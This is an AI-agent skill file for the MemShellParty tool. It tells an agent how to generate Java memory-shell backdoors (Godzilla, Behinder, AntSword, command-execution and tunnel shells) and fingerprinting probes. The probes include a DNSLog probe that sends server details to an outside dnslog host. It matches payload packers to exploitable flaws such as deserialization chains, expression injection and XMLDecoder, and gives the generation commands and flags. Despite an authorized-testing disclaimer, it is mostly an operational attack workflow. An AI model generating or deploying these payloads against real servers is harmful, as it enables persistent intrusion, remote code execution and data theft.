---
name: memshell-party
description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools). Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom) or a probe to fingerprint a target middleware — for authorized security testing, red-team engagements, or research only.
---

# MemShellParty skill

Generate Java memory shells and probe shells via the MemShellParty backend (`https://party.mem.mk`
by default, or a self-hosted instance). The same HTTP API powers the `party.mem.mk/ui` web app.

> ⚠️ Authorized testing only. Never generate or deploy a payload against a target you do not own or
> do not have explicit written permission to test. You are responsible for how these payloads are used.

## How to talk to the tool

Two equivalent interfaces — pick whichever is available:

- **CLI**: `memparty <command> [flags]` (install: `npm install -g memshell-party-cli`, or `npx memshell-party-cli`).
- **MCP tools** (if the `memshell-party` MCP server is connected): `list_servers`, `list_config`,
  `list_packers`, `list_command_configs`, `generate_memshell`, `generate_probe`, `parse_classname`,
  `server_version`.

The CLI is the source of truth for examples below; MCP tool args mirror the CLI flags
(`-s/--server` → `server`, `-t/--tool` → `shellTool`, `-y/--type` → `shellType`, `-p/--packer` → `packer`).

## Step 0 — Discover, don't guess

The backend supports ~17 servers, 9 shell tools, dozens of shell types, and 60+ packers. **Never
hard-code a server/packer name from memory.** Always enumerate first:

```bash
memparty config servers            # every server + its shell types
memparty config tools Tomcat       # one server's tools + types
memparty config packers            # packer parent/child tree
memparty config command            # Command-tool encryptors & implementation classes
```

Add `--json` for machine-readable output. Use the exact strings these return.

## Step 1 — Pick the four core options

Every memory shell needs **server → shell tool → shell type → packer**.

### server
The target middleware/framework. Match it to the actual target (e.g. `Tomcat`, `Jetty`,
`SpringWebMvc`, `JBoss`, `WebLogic`, `Undertow`, `Resin`, `Struts2`…). Use `memparty config servers`
to confirm it's supported. If you only know "it's a Spring Boot app", that's `SpringWebMvc`.

### shell tool (what the memshell does once injected)
| Tool | Use when |
|------|----------|
| `Godzilla` | Godzilla-compatible encrypted webshell (pass + key) |
| `Behinder` | Behinder ("冰蝎") encrypted webshell (pass) |
| `AntSword` | AntSword ("蚁剑") webshell (pass) |
| `Command` | Single command execution / RCE (param name + encryptor) |
| `Suo5` / `Suo5v2` | SOCKS5 proxy tunnel via Suo5 |
| `NeoreGeorg` | NeoreGeorg tunneling shell |
| `Proxy` | Generic proxy (often WebSocket-based) |
| `Custom` | Your own `.class` bytecode (`--shell-class-file` or `--shell-class-base64`) |

### shell type (where it hooks into the server)
`Listener`, `Filter`, `Servlet`, `Valve`, `Handler`, `Customizer`… plus `Jakarta*` variants and
`Agent*` variants. Rules of thumb:
- **`Jakarta`-prefixed types** → target uses **Jakarta EE** (Servlet 5+, e.g. Tomcat 10+, Spring Boot 3).
  Non-prefixed → **javax** (Servlet 3/4, Tomcat 9 and below, Spring Boot 2).
- **`Agent`-prefixed types** → attach via a Java agent (needs the `AgentJar*` packer family, not class bytes).
- **`WebSocket*` / `Upgrade`** → hijack a WebSocket / HTTP-upgrade endpoint (stealthier; survives fewer
  filters). `Proxy` tool commonly pairs with `WebSocket` types.
- Not every tool supports every type — `memparty config tools <server>` shows the legal combinations.

### packer (how to deliver/instantiate the payload)
The packer must match the **delivery vector** (the vuln you're exploiting). Pick by scenario:

| Scenario / vuln | Packer family (leaf names) |
|-----------------|----------------------------|
| Class bytecode, base64 (manual load) | `DefaultBase64`, `Base64URLEncoded`, `GzipBase64` |
| Drop a JSP file | `JSP`, `ClassLoaderJSP`, `DefineClassJSP`, `JSPX`, … |
| `Class.forName` / `defineClass` via big int | `BigInteger` |
| BCEL-encoded classloading | `BCEL` |
| `TemplatesImpl` (XSLT translet) RCE | `JDKAbstractTransletPacker`, `XalanAbstractTransletPacker`, `OracleAbstractTransletPacker` |
| Script engine eval (`ScriptEngineManager`) | `ScriptEngine`, `DefaultScriptEngine`, `ScriptEngineBigInteger` |
| Expression injection | `SpEL`, `OGNL`, `EL`, `MVEL`, `Aviator`, `JEXL`, `JXPath`, `Groovy`, `Velocity`, `Freemarker`, `JinJava`, `BeanShell`, `Rhino` |
| Java deserialization gadget chain | `JavaCommonsBeanutils19/18/17/16/110`, `JavaCommonsCollections3/4` (under `JavaDeserialize`) |
| Hessian deserialization | `HessianDeserialize`, `Hessian2Deserialize` (+ `*XSLTScriptEngine` variants) |
| `XMLDecoder` RCE | `XMLDecoder`, `XMLDecoderScriptEngine`, `XMLDecoderDefineClass` |
| Java agent attach (needs `Agent*` shell type) | `AgentJar`, `AgentJarWithJDKAttacher`, `AgentJarWithJREAttacher` |
| H2 DB console / arbitrary JDBC | `H2`, `H2Javac`, `H2JS`, `H2JSURLEncode` |
| Whole payload as a runnable JAR | `Jar`, `ScriptEngineJar`, `GroovyTransformJar` |
| XXL-JOB endpoint | `XxlJob` |

> **Aggregate vs leaf packers:** parent packers like `Base64`, `JSP`, `JavaDeserialize`,
> `AbstractTranslet`, `ScriptEngine`, `OGNL`, `SpEL`… return *several* variants at once
> (`allPackResults`). For a single payload, pick a **leaf** (child) packer. Run
> `memparty config packers` to see the parent→child tree.

## Step 2 — Probe (fingerprint first when unsure)

If you don't know the target middleware, generate a **probe** to detect it before committing to a
memshell. Probes have a strict method × content matrix — only these combos work:

| Method (`-m`) | Supported contents (`-c`) | Extra flags |
|---------------|---------------------------|-------------|
| `DNSLog` | `Server`, `JDK` | `--host <dnslog.domain>` |
| `Sleep` | `Server` only | `--sleep-server <guess> --seconds N` |
| `ResponseBody` | `Command`, `Bytecode`, `Filter`, `ScriptEngine` | `--server <guess> --req-param-name <p>` (Command also takes `--command-template`) |

> `OS`, `BasicInfo` are enum values but **not usable** through any method — don't use them.

```bash
# Blind: does the target resolve our DNS? Which server is it?
memparty probe -m DNSLog -c Server -p DefaultBase64 --host xxx.dnslog.cn

# Time-based blind fingerprint (server responds after N seconds if it's --sleep-server)
memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5

# OOB-visible: run a command and echo it into the HTTP response body
memparty probe -m ResponseBody -c Command -p DefaultBase64 --server Tomcat --req-param-name p
```

The detected server name from a probe is exactly the `server` value to use for `memparty gen`.

## Step 3 — Generate

```bash
memparty gen -s <server> -t <tool> -y <type> -p <packer> [tool-specific flags] [--jdk <v>]
```

Common tool-specific flags:
- Godzilla: `--godzilla-pass`, `--godzilla-key`
- Behinder: `--behinder-pass`
- AntSword: `--antsword-pass`
- Command: `--command-param-name`, `--encryptor RAW|BASE64|DOUBLE_BASE64`, `--implementation-class RuntimeExec|ForkAndExec`
- All webshell tools: `--header-name` / `--header-value` (auth header the shell checks)
- Custom: `--shell-class-file path.class` (or `--shell-class-base64`)
- Injector: `--url-pattern /*`, `--injector-class-name`, `--no-static-initialize`

Output:
- payload → **stdout** by default.
- `-o shell.class` / `-o shell.jar` → auto base64-decodes and writes binary.
- `--json` → full response (class names, sizes, base64 bytes, config echo) for downstream tooling.

## Gotchas

- **Jakarta vs javax.** Tomcat 10+ / Spring Boot 3 → `Jakarta*` shell types. Tomcat 9- / Spring Boot 2
  → non-prefixed. Picking the wrong family = the shell won't load.
- **JDK target.** `--jdk java6/8/9/11/17/21` (or bare `8`, or raw major `52`). Match (or stay ≤) the
  target's JDK so the bytecode loads. JDK 9+ auto-enables Java-module bypass unless `--no-bypass-module`.
- **Spring-gzip packers** (`SpEL`/`OGNL`/`JXPath` + their `*SpringGzip*` / `*JDK17` variants) need a
  special injector class name — the CLI generates one automatically; don't override
  `--injector-class-name` for these.
- **Shrink is on by default** (smaller bytecode). Use `--no-shrink` only if a stripped payload misbehaves.
- **Aggregate packers** return multiple variants — pick a leaf for a single payload (see Step 1).
- **Agent memshells** (`Agent*` types) require the `AgentJar*` packer family and a JVM attach; they
  aren't class-byte payloads.
- **Backend override.** Default is the public `https://party.mem.mk` (good for trying things, but
  don't trust payloads from public services in real engagements — self-host with Docker and use
  `MEMPARTY_API_URL` or `--api`).

## Reverse: parse a class name

Got a `.class` and want its fully-qualified name (e.g. to confirm what you generated or analyze a sample)?

```bash
memparty parse-classname --file shell.class
memparty parse-classname <base64-of-class-bytes>
```
